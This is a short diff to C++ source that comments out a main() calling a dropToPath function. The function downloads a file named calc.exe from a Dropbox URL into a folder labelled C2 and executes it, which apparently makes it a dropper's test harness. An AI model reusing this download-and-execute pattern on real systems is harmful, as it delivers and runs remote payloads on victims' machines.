@@ -21,7 +21,9 @@ void dropToPath(std::string url, std::string filePath, bool execute) {
 	}
 }
 
+/*
 int main(int argc, char* argv[]) {
 	dropToPath("https://www.dropbox.com/s/2rx3deidm6h16tx/calc.exe?dl=1", "C:\\Users\\53444\\Downloads\\C2\\calc.exe", 1);
 	return 0;
 }
+*/
